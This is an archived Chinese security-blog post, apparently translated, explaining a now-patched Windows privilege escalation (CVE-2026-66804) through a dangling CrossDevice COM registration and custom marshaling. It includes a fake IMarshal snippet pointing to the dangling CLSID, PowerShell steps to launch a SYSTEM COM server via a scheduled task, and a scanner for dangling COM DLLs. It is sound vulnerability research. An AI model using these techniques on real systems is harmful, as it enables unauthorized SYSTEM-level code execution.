---
cve: "CVE-2026-66804"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  Windows漏洞利用技术：悬空COM​​对象注册  
 Ots安全   2026-09-25 04:51  
  
**威胁简报**  
  
  
**恶意软件**  
  
  
**漏洞攻击**  
  
这篇简短的博文是关于滥用微软最近在 Windows 中修复的一个权限提升漏洞CVE-2026-66804的，我和其他 14 人都报告过这个漏洞。这个问题是对 CVE-2026-50343 的一个不完整的修复，CVE-2026-50343 是一个被 Calif称为“黑暗电梯”的漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/zNsFJyIuL0Gg2GeSjqhVJjROVL1psqZNlrEpAPfEkial9rLGtogSDcO8K49uDaf6ncr6ZS4IpLiacxic6icMeyPr9rLDzIsLILDYDiaWMEJiaZFicY/640?wx_fmt=png&from=appmsg "")  
  
该漏洞的根本原因是 CLSID 为 CLSID 的 CrossDevice COM 对象存在悬空 COM 对象注册{E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496}。COM 注册通常需要两部分：服务器可执行文件（对于进程内组件，这是一个 DLL 文件）以及HKEY_CLASSES_ROOT指向该 DLL 的注册表项下的 CLSID 条目。  
  
该对象已在系统级类注册表中注册，这意味着系统上的所有用户（包括系统服务）都可以访问它。但是，服务器可执行文件缺失。具体来说，它注册使用了一个 DLL 文件 %PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll。该路径不仅不存在，而且还位于一个C:\ProgramData目录中。该目录是系统上所有用户的公共位置，因此允许任何人创建目录。因此，您可以在该位置创建任意 DLL 文件，并实例化 COM 对象，这可能会导致权限提升。  
  
但是如何将 COM 对象（进而 DLL）加载到特权进程中呢？Calif 在博客中提到的已修复漏洞 CVE-2026-50343 利用了注册表项权限不足的问题，将该类添加为安装程序插件，然后将InstallService其加载到内存中。InstallService 的问题已修复，因此我们需要另一种方法来利用未修复的悬空 COM 引用。  
### 再次滥用自定义 COM 编组  
  
我过去曾多次使用一种技巧，即利用自定义 COM 封送机制，将任意 DLL 加载到特权进程中。当您调用一个在进程外实现的接口方法时，COM 运行时会将参数封送为 RPC 调用并发送到服务器。如果参数是 COM 对象，则运行时会将该对象封送为 OBJREF 结构，以便服务器可以使用该对象。下图显示了两种主要的 OBJREF 类型，您也可以在此处的官方 DCOM 文档中了解更多信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/zNsFJyIuL0FONdU6qicqFMkMfdibh83YtRFzzy7r4cs1ufjyPmSbEL3uI1MC9rfrUHkG4ojlGExtia4FmNNHQxM28fQaXWOmUticsSSNLuSwAjE/640?wx_fmt=png&from=appmsg "")  
  
默认的 COM 封送策略是按引用封送，它会生成一个包含连接到原始对象所需所有信息的标准 OBJREF。该对象甚至可能位于完全不同的计算机上。当对象被解封送时，这些信息会用于创建一个返回调用方的 RPC 通道，以便服务器可以调用对象上的方法。  
  
如果对象实现了IMarshal接口，运行时还支持可选的按值封送机制。这允许对象指定一个任意的 CLSID 作为反封送对象，该 CLSID 不必与传入的对象相同。当对象在服务器端反封送时，会使用该 CLSID 查找要加载的进程内服务器 DLL。   
  
因此，利用悬空 COM 对象注册漏洞的一个显而易见的技巧是，向特权 COM 服务发送一个自定义 OBJREF，并指定悬空对象的 CLSID。当该 OBJREF 被反序列化时（反序列化会在运行时自动发生，在目标方法被调用之前），恶意 DLL 将被加载，从而实现权限提升。以下代码展示了在IMarshal实现中指定悬空 COM 类是多么简单：  
```
class FakeMarshal : public IMarshal {
    // Inherited via IMarshal
    HRESULT GetUnmarshalClass(REFIID riid, void* pv, 
                              DWORD dwDestContext, void* pvDestContext, 
                              DWORD mshlflags, CLSID* pCid) override
    {
        return CLSIDFromString(L"{E9F83CF2-E0C0-4CA7-AF01-E90C70BEF496}", pCid);
    }
    // ...
};
```  
  
我们需要找到一个具有特权的服务，将封送后的 COM 对象发送给管理员。然而，找到这样的服务并非易事。自定义封送对象会导致任意 DLL 被加载到进程中并执行代码，这是一个风险很高的操作，尤其是在跨越权限边界的情况下。因此，微软实施了一项缓解措施，可以启用该措施来禁用进程中的自定义封送，除非该类被明确选择启用，或者属于少数受信任的组件（例如运行时库中的类）。  
  
自 Windows 8 起，此缓解措施通过两种机制实现。第一种也是最初的方法是EOAC_NO_CUSTOM_MARSHAL在调用`CoInitializeSecurity`时设置 `capabilities` 标志。第二种方法是为了提高 AppContainer 沙箱的安全性而添加的，它通过 ` IGlobalOptions::Set`方法并指定COMGLB_UNMARSHALING_POLICY属性类型来设置。由于我们并非试图逃离沙箱，因此唯一重要的值是COMGLB_UNMARSHALING_POLICY_STRONG`disabled custom marshaling`，其作用类似于 `capabilities` 标志。  
  
由于悬空的 COM 对象未注册为受信任的封送器，这意味着我们需要找到一个未启用这些缓解措施的特权 COM 服务器。最简单的方法是在运行时扫描进程。功能标志存储在值中，combase!gCapabilities而封送策略存储在combase!g_GLBOPT_UnmarshalingPolicy。   
  
然而，我一直觉得肯定存在一个以 SYSTEM 权限运行且不启用自定义封送的 COM 服务。经过一番摸索，我找到了一个，当然肯定还有其他的。结果发现，它正是我之前研究和利用过的一个 COM 服务Shell Create Object Handler对象。这是一个有趣的 COM 对象，因为它虽然以 SYSTEM 权限运行，却不能直接实例化：  
```
PS> $cls = Get-ComClass -Clsid 135fd325-45b7-4c30-89f8-4386961669f0
PS> $o = New-ComObject -Class $cls
Exception calling "CreateInstanceAsObject" with "3" argument(s): "Class not registered"
PS> $cls.AppIdEntry | Select Name, RunAs, IsService
Name                        RunAs               IsService
----                        -----               ---------
Shell Create Object Handler nt authority\system     False
```  
  
通常情况下，当 COM 对象由特权服务托管时，它会注册为系统服务的名称，RPCSS 会在请求该对象类时自动启动该系统服务。然而，由于本例中没有相应的服务，创建对象会失败并出现“类未注册”错误。要创建 COM 服务器，必须先以 SYSTEM 用户身份运行该服务，然后再调用相关函数CoCreateInstance。   
  
您需要通过\Microsoft\Windows\Shell\CreateObjectTask计划任务启动特权服务器。幸运的是，普通用户也可以启动此任务，您可以使用我的Get-AccessibleScheduledTask命令进行验证：  
```
PS> Get-AccessibleScheduledTask -Executable | 
         ? Name -Match Shell\\CreateObjectTask
TokenId  Access                     Name
-------  ------                     ----
77E3156D GenericExecute|GenericRead ...\Shell\CreateObjectTask
```  
  
当然，仅仅启动这个任务是不够的，你还需要创建一个全局命名事件，ShellCreateObjectTaskReadyEvent否则任务会立即退出，而不会导出 COM 服务。下面展示了一个创建实例的简单脚本：  
```
PS> $ev = New-NtEvent -Win32Path "Global\ShellCreateObjectTaskReadyEvent" -InitialState $false
PS> Start-ScheduledTask -TaskPath "\Microsoft\Windows\Shell\" -TaskName "CreateObjectTask"
PS> $ev.Wait()
PS> $o = New-ComObject -Clsid "135fd325-45b7-4c30-89f8-4386961669f0"
PS> $o
InterfaceName Iid
------------- ---
IUnknown      00000000-0000-0000-c000-000000000046
```  
  
Get-ComProcess您可以使用命令并检查属性来验证对象是否托管在特权进程中CustomMarshalAllowed。请注意，由于结构更改（我尚未更新），此命令目前在 Windows 11 25H2 上无法正常工作，但在之前的版本中仍然有效。  
```
PS> $objref = Get-ComObjRef -Object $o
PS> $p = Get-ComProcess -ProcessId $objref.ProcessId
PS> $p | Select Name, User, CustomMarshalAllowed
Name    User                CustomMarshalAllowed
----    ----                --------------------
dllhost NT AUTHORITY\SYSTEM                 True
```  
  
至此，我们已具备利用悬空 COM 对象所需的一切条件：一个以 SYSTEM 权限运行且允许自定义封送的 COM 服务已经准备就绪。我们可以使用CoGetInstanceFromIStorage API 创建该对象，并将“伪造的”封送对象作为pstg参数传递。该对象将被封送至 COM 服务器进程，并在对象激活期间无条件地解封。我们需要实现一个伪造的IStorage接口才能绕过本地 API 实现，这并不难，但我还是想看看是否有更简便的方法。让我们来看看支持的接口：  
```
PS> Get-ComInterface -Object $o
Name                 IID               HasProxy   HasTypeLib     
----                 ---               --------   ----------     
IUnknown             00000000-0000-... False      False          
IMarshal             00000003-0000-... False      False          
IMarshal2            000001cf-0000-... False      False          
ICreateObject        75121952-e0d0-... True       False
PS> Get-ComInterface -Name ICreateObject | ConvertTo-ComSourceCode -Parse
[
  object,
  uuid(75121952-E0D0-43E5-9380-1D80483ACF72),
]
interface ICreateObject : IUnknown {
    HRESULT Proc3([in] GUID* p0, [in] IUnknown* p1, 
                  [in] GUID* p2, [out, iid_is(p2)] IUnknown** p3);
}
```  
  
COM 对象只有一个唯一的接口ICreateObject。将接口代理转换为 IDL 后发现，它接受一个IUnknown指针作为第二个参数。因此，为了利用悬空的 COM 注册，我们可以将“伪造的”封送对象传递给该参数，从而获得特权代码执行权限。我已经将此漏洞的更新版完整漏洞利用程序附加到此处的原始问题中。  
  
值得注意的是，虽然这种利用技术可以轻松利用悬空的 COM 注册，但它也可以用于利用存在缺陷的 COM 类自定义反序列化器。有时，仅仅是将 DLL 加载到进程中就可能导致崩溃。   
### 查找原始的悬空 COM 对象注册  
  
作为补充说明，快速查找其他悬空 COM 服务器的方法是使用以下 PowerShell 脚本，并安装 myOleViewDotNet和NtObjectManager模块：  
```
function Test-ComServer {
    param($Server)
    try {
        Use-NtObject($lib = Import-Win32Module -Path $Server -Flags AsDataFile) {
            $true
        }
    } catch {
        $false
    }
}
PS> $db = Get-ComDatabase -LoadMode MachineOnly
PS> $cs = Get-ComClass -Database $db -ServerType InProcServer32
PS> $cs | ? { -not (Test-ComServer $_.DefaultServer) } | 
        Sort DefaultServer | Select Name, DefaultServer
```  
  
这将打印出机器配置单元中所有找不到 DLL 的进程内 COM 类LoadLibrary。务必LoadLibrary通过Import-Win32Module命令执行此操作，因为某些 COM 注册仅指定文件名，您需要确保这些注册信息能够根据系统路径正确解析。  
  
此脚本会在未打补丁的系统中查找悬空的 CrossDevice COM 类。请注意，您需要手动检查路径，以确定是否可以在该位置放置 DLL 文件。您还可以通过检查路径是否位于可写入的目录中，甚至测试是否可以修改现有的 DLL 文件来使其更加智能，但这留给读者自行探索。  
  
**END**  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/zNsFJyIuL0GMm0C3PibJ82GODxXwMpeBAzTj0aseib6Fht5xVRWPFCmCg6Odt5whNcG17wKDPkd0vhOax9xhviaZ7yR09pIuCYAjaqlHBxwXlk/640?wx_fmt=jpeg&from=appmsg "")  
  
  
公众号内容都来自国外等平台- 搜索的内容通过结合编写 -   
  
公众号 |   
AnQuan7 (Ots安全)  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
